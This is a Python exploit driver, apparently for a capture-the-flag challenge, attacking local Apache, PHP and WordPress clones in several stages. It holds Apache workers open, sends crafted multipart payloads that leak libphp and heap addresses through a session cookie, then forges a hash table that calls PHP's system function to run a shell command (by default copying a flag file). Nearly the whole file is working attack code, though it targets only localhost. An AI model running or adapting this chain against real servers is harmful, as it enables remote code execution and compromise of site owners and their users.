#!/usr/bin/env python3

import argparse
import hashlib
import json
import socket
import struct
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass
from pathlib import Path
from typing import Callable

from payloads import (
    build_a1,
    build_a1_83,
    build_a1_85,
    build_a2,
    build_b1,
    build_b1_83,
    build_b1_85,
    build_b2,
    build_b2_85,
)

HOST = "127.0.0.1"
QUERY = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
HOLDER_BODY = b"x" * 16384
A2_BYTES = 279369
A2_SHA256 = "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"


@dataclass(frozen=True)
class ApacheProfile:
    name: str
    scope: str
    default_port: int
    default_workers: int
    default_flag: str
    default_proof: Path
    a1_path: str
    stage_path: str
    warm_path: str | None
    a1_builder: Callable[[], bytes]
    b1_builder: Callable[[], bytes]
    b2_builder: Callable[[int, int, str], bytes]
    a1_bytes: int
    a1_sha256: str
    b1_bytes: int
    b1_sha256: str
    dtor_offset: int
    zif_system_offset: int
    main_offset: int
    dtor_count_min: int
    main_count_min: int
    candidate_count_target: int | None = None
    exclude_top_bucket: bool = False
    main_fingerprint: frozenset[int] = frozenset()
    lib_alignment: int = 0x1000


PROFILES = {
    "apache83": ApacheProfile(
        name="apache83",
        scope="local Apache 8.3.35 and WordPress 7.1.3 clone",
        default_port=18323,
        default_workers=1,
        default_flag="hitcon{local_apache83_instance_do_not_submit}",
        default_proof=Path("profiles/apache83/proofs/local_flag"),
        a1_path="/wp-includes/version.php" + QUERY,
        stage_path="/wp-includes/version.php",
        warm_path=None,
        a1_builder=build_a1_83,
        b1_builder=build_b1_83,
        b2_builder=build_b2,
        a1_bytes=1055572,
        a1_sha256="06df8ca2348a58d84393ba5dc110b517a95173dcd8e4d2492275b30de52fa2e8",
        b1_bytes=33128677,
        b1_sha256="2fcaaf87310b70a507f7860671871de8abbd9003e4e883ab9f6af48a4cc8db4f",
        dtor_offset=0x49EC50,
        zif_system_offset=0x3AC080,
        main_offset=0xF9398,
        dtor_count_min=30,
        main_count_min=50,
    ),
    "apache84": ApacheProfile(
        name="apache84",
        scope="local Apache 8.4.26 and WordPress 7.0.7 clone",
        default_port=18322,
        default_workers=150,
        default_flag="hitcon{local_apache_instance_do_not_submit}",
        default_proof=Path("lab/apache/proofs/local_flag"),
        a1_path="/wp-includes/version.php" + QUERY,
        stage_path="/wp-includes/version.php",
        warm_path="/wp-includes/version.php",
        a1_builder=build_a1,
        b1_builder=build_b1,
        b2_builder=build_b2,
        a1_bytes=1060211,
        a1_sha256="8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6",
        b1_bytes=33128677,
        b1_sha256="b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2",
        dtor_offset=0x65EB60,
        zif_system_offset=0x465370,
        main_offset=0xF8398,
        dtor_count_min=1,
        main_count_min=1,
        candidate_count_target=87,
        exclude_top_bucket=True,
    ),
    "apache85": ApacheProfile(
        name="apache85",
        scope="local Apache 8.5.11 and WordPress 7.1.3 clone",
        default_port=18325,
        default_workers=1,
        default_flag="hitcon{local_apache85_instance_do_not_submit}",
        default_proof=Path("profiles/apache85/proofs/local_flag"),
        a1_path="/index.php" + QUERY,
        stage_path="/wp-content/index.php",
        warm_path=None,
        a1_builder=build_a1_85,
        b1_builder=build_b1_85,
        b2_builder=build_b2_85,
        a1_bytes=1060516,
        a1_sha256="920b421a4523a6ba80bab7535a63631e88e4f0bb20e34bd72d9d670e6667aa5b",
        b1_bytes=34767231,
        b1_sha256="9845f283095db8313928316949bb721d7bc9dc3571563daf2da42ca313b85f93",
        dtor_offset=0x7B47A0,
        zif_system_offset=0x5996E0,
        main_offset=0xF7398,
        dtor_count_min=250,
        main_count_min=40,
        main_fingerprint=frozenset({0x56160, 0x571E0, 0x6B02B, 0x186E40}),
        lib_alignment=0x200000,
    ),
}


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def info(text):
    print(f"[*] {text}", flush=True)


def good(text):
    print(f"[+] {text}", flush=True)


def recv_all(sock, limit=4 << 20):
    out = bytearray()
    try:
        while len(out) < limit:
            block = sock.recv(65536)
            if not block:
                break
            out += block
    except OSError:
        pass
    return bytes(out)


def send_chunked(port, path, body, timeout):
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{port}\r\n"
        "Content-Type: multipart/form-data; boundary=CCCCCCCCCC\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    sock = socket.create_connection((HOST, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        try:
            sock.sendall(header)
            for offset in range(0, len(body), 65536):
                block = body[offset:offset + 65536]
                sock.sendall(("%x\r\n" % len(block)).encode())
                sock.sendall(block)
                sock.sendall(b"\r\n")
            sock.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        return recv_all(sock)
    finally:
        sock.close()


def send_plain(port, path, body, timeout):
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{port}\r\n"
        "Content-Type: multipart/form-data; boundary=CCCCCCCCCC\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    sock = socket.create_connection((HOST, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        try:
            sock.sendall(header + body)
        except OSError:
            pass
        return recv_all(sock, 1 << 20)
    finally:
        sock.close()


def get(port, path):
    sock = socket.create_connection((HOST, port), timeout=15)
    sock.settimeout(15)
    try:
        sock.sendall(f"GET {path} HTTP/1.0\r\nHost: x\r\n\r\n".encode())
        return recv_all(sock, 2 << 20)
    finally:
        sock.close()


def hold_workers(port, path, workers):
    if workers <= 1:
        return []
    holders = []
    for index in range(workers - 1):
        try:
            sock = socket.create_connection((HOST, port), timeout=5)
            request = (
                f"POST {path} HTTP/1.1\r\n"
                "Host: 127.0.0.1\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 1048576\r\n\r\n"
            ).encode()
            sock.sendall(request + HOLDER_BODY)
            holders.append(sock)
        except OSError as error:
            info(f"holder {index + 1}/{workers - 1} failed: {error}")
            break
        time.sleep(0.01)
    time.sleep(0.8)
    info(f"pinned {len(holders) + 1}/{workers} Apache workers")
    if len(holders) != workers - 1:
        for sock in holders:
            sock.close()
        raise RuntimeError("could not pin every Apache worker except one")
    return holders


def http_status(response):
    first = response.split(b"\r\n", 1)[0].split()
    return int(first[1]) if len(first) >= 2 and first[1].isdigit() else 0


def parse_leak(response, profile):
    if http_status(response) != 200:
        raise RuntimeError(f"B1 returned HTTP {http_status(response) or 'no response'}")
    marker = b"Set-Cookie: PHPSESSID="
    if response.count(marker) != 1:
        raise RuntimeError(f"B1 returned {response.count(marker)} PHPSESSID cookies")
    raw = response.split(marker, 1)[1].split(b"; path=/", 1)[0]
    decoded = urllib.parse.unquote_to_bytes(raw.decode("latin1"))
    if len(decoded) != 0xC8000:
        raise RuntimeError(f"B1 decoded cookie has {len(decoded)} bytes")

    qwords = [
        struct.unpack_from("<Q", decoded, offset)[0]
        for offset in range(0, len(decoded) - 7, 8)
    ]
    pointers = Counter(
        value for value in qwords if 0x700000000000 <= value <= 0x7FFFFFFFFFFF
    )
    if not pointers:
        raise RuntimeError("B1 cookie contains no canonical x86_64 pointers")
    zval_ptr_dtor, dtor_count = pointers.most_common(1)[0]
    libphp = zval_ptr_dtor - profile.dtor_offset
    if dtor_count < profile.dtor_count_min or libphp % profile.lib_alignment:
        raise RuntimeError(
            f"B1 code pointer gate failed: {zval_ptr_dtor:#x} x{dtor_count}"
        )

    chunks = {}
    for value in qwords:
        if 0x700000000000 <= value <= 0x7FFFFFFFFFFF:
            chunks.setdefault(value & ~0x1FFFFF, []).append(value & 0x1FFFFF)

    if profile.main_fingerprint:
        matches = [
            (base, len(offsets))
            for base, offsets in chunks.items()
            if profile.main_fingerprint.issubset(set(offsets))
        ]
        if len(matches) != 1 or matches[0][1] < profile.main_count_min:
            raise RuntimeError(f"B1 main-chunk fingerprint gate failed: {matches}")
        candidates = matches
    else:
        counts = Counter({base: len(offsets) for base, offsets in chunks.items()})
        excluded = {zval_ptr_dtor & ~0x1FFFFF}
        if profile.exclude_top_bucket and counts:
            excluded.add(counts.most_common(1)[0][0])
        candidates = [
            (base, count)
            for base, count in counts.items()
            if base not in excluded
            and 0x1A00000 <= libphp - base <= 0x1F00000
            and count >= profile.main_count_min
        ]
        if profile.candidate_count_target is None:
            candidates.sort(key=lambda item: item[1], reverse=True)
        else:
            candidates.sort(
                key=lambda item: (
                    abs(item[1] - profile.candidate_count_target),
                    -item[1],
                )
            )
        if not candidates:
            raise RuntimeError("B1 leak contains no calibrated main-heap candidate")

    return {
        "decoded_bytes": len(decoded),
        "zval_ptr_dtor": zval_ptr_dtor,
        "zval_ptr_dtor_count": dtor_count,
        "libphp": libphp,
        "main_candidates": candidates[:3],
    }


def checked_payloads(profile):
    a1 = profile.a1_builder()
    b1 = profile.b1_builder()
    a2 = build_a2()
    checks = (
        ("A1", a1, profile.a1_bytes, profile.a1_sha256),
        ("B1", b1, profile.b1_bytes, profile.b1_sha256),
        ("A2", a2, A2_BYTES, A2_SHA256),
    )
    for name, body, size, digest in checks:
        if len(body) != size or sha256(body) != digest:
            raise RuntimeError(f"{profile.name} {name} payload changed")
    return a1, b1, a2


def run(args, profile):
    out = args.output_dir
    out.mkdir(parents=True, exist_ok=False)
    if args.proof.exists():
        raise RuntimeError(f"proof path already exists: {args.proof}")
    a1, b1, a2 = checked_payloads(profile)
    journal = {
        "scope": profile.scope,
        "profile": profile.name,
        "target": f"http://{HOST}:{args.port}{profile.stage_path}",
        "workers": args.workers,
        "expected_marker": args.expected_marker,
        "stages": [],
    }

    def note(name, **facts):
        journal["stages"].append({"name": name, **facts})
        (out / "journal.json").write_text(json.dumps(journal, indent=2) + "\n")

    holders = hold_workers(args.port, profile.stage_path, args.workers)
    try:
        if profile.warm_path is not None:
            response = get(args.port, profile.warm_path)
            (out / "warm.response.bin").write_bytes(response)
            note("warm", response_bytes=len(response), response_sha256=sha256(response))
            if http_status(response) != 200:
                raise RuntimeError("warm request did not return HTTP 200")

        info(f"{profile.name} A1: leaving the stale session ID")
        response = send_chunked(args.port, profile.a1_path, a1, 180)
        (out / "a1.response.bin").write_bytes(response)
        note(
            "a1",
            status=http_status(response),
            request_bytes=len(a1),
            request_sha256=sha256(a1),
            response_bytes=len(response),
            response_sha256=sha256(response),
        )
        if http_status(response) != 500:
            raise RuntimeError(f"A1 returned HTTP {http_status(response) or 'no response'}")
        time.sleep(0.2)

        info(f"{profile.name} B1: leaking libphp and the main heap")
        response = send_chunked(args.port, profile.stage_path, b1, args.timeout)
        (out / "b1.response.bin").write_bytes(response)
        leak = parse_leak(response, profile)
        note(
            "b1",
            status=http_status(response),
            request_bytes=len(b1),
            request_sha256=sha256(b1),
            response_bytes=len(response),
            response_sha256=sha256(response),
            decoded_bytes=leak["decoded_bytes"],
            zval_ptr_dtor=hex(leak["zval_ptr_dtor"]),
            zval_ptr_dtor_count=leak["zval_ptr_dtor_count"],
            libphp=hex(leak["libphp"]),
            main_candidates=[
                [hex(address), count] for address, count in leak["main_candidates"]
            ],
        )
        good(f"libphp: {hex(leak['libphp'])}")

        zif_system = leak["libphp"] + profile.zif_system_offset
        for attempt, (main, count) in enumerate(leak["main_candidates"], 1):
            address = main + profile.main_offset
            info(f"{profile.name} A2/B2 candidate {attempt}: main={hex(main)}")
            a2_response = send_plain(args.port, profile.stage_path, a2, args.timeout)
            (out / f"a2-{attempt}.response.bin").write_bytes(a2_response)
            if http_status(a2_response) != 500:
                raise RuntimeError(
                    f"A2 returned HTTP {http_status(a2_response) or 'no response'}"
                )
            time.sleep(0.2)

            b2 = profile.b2_builder(address, zif_system, args.command)
            b2_response = send_plain(args.port, profile.stage_path, b2, args.timeout)
            (out / f"b2-{attempt}.response.bin").write_bytes(b2_response)
            time.sleep(0.8)
            proof = args.proof.read_bytes() if args.proof.is_file() else None
            note(
                "a2_b2",
                attempt=attempt,
                main=hex(main),
                main_bucket_count=count,
                fake_hash_table=hex(address),
                zif_system=hex(zif_system),
                a2_request_bytes=len(a2),
                a2_request_sha256=sha256(a2),
                a2_response_bytes=len(a2_response),
                a2_response_sha256=sha256(a2_response),
                b2_request_bytes=len(b2),
                b2_request_sha256=sha256(b2),
                b2_response_bytes=len(b2_response),
                b2_response_sha256=sha256(b2_response),
                proof_bytes=None if proof is None else len(proof),
                proof_sha256=None if proof is None else sha256(proof),
            )
            if proof is not None and args.expected_marker.encode() in proof:
                result = {
                    "success": True,
                    "profile": profile.name,
                    "flag": args.expected_marker,
                    "libphp": hex(leak["libphp"]),
                    "main": hex(main),
                    "zif_system": hex(zif_system),
                    "proof_sha256": sha256(proof),
                }
                (out / "result.json").write_text(json.dumps(result, indent=2) + "\n")
                note("complete", **result)
                good(f"{profile.name} B2 copied the local dummy flag")
                print(json.dumps(result, indent=2))
                return result
        raise RuntimeError("every leaked main-heap candidate missed the proof")
    except Exception as error:
        note("abort", error=f"{type(error).__name__}: {error}")
        raise
    finally:
        for sock in holders:
            try:
                sock.close()
            except OSError:
                pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--profile", choices=sorted(PROFILES), default="apache84")
    parser.add_argument("--execute", action="store_true")
    parser.add_argument("--port", type=int)
    parser.add_argument("--workers", type=int)
    parser.add_argument("--proof", type=Path)
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument("--expected-marker")
    parser.add_argument("--command", default="cat /flag >/out/local_flag")
    parser.add_argument("--timeout", type=float, default=120)
    args = parser.parse_args()

    profile = PROFILES[args.profile]
    args.port = profile.default_port if args.port is None else args.port
    args.workers = profile.default_workers if args.workers is None else args.workers
    args.proof = profile.default_proof if args.proof is None else args.proof
    args.output_dir = (
        Path("runs") / profile.name if args.output_dir is None else args.output_dir
    )
    args.expected_marker = (
        profile.default_flag if args.expected_marker is None else args.expected_marker
    )

    if not 1 <= args.port <= 65535:
        parser.error("bad port")
    if not 1 <= args.workers <= 150:
        parser.error("workers must be between 1 and 150")
    a1, b1, a2 = checked_payloads(profile)
    if not args.execute:
        print(
            json.dumps(
                {
                    "mode": "offline_plan",
                    "profile": profile.name,
                    "a1_target": f"http://{HOST}:{args.port}{profile.a1_path}",
                    "stage_target": f"http://{HOST}:{args.port}{profile.stage_path}",
                    "workers": args.workers,
                    "a1": {"bytes": len(a1), "sha256": sha256(a1)},
                    "b1": {"bytes": len(b1), "sha256": sha256(b1)},
                    "a2": {"bytes": len(a2), "sha256": sha256(a2)},
                    "live_requests": 0,
                },
                indent=2,
            )
        )
        return
    run(args, profile)


if __name__ == "__main__":
    main()
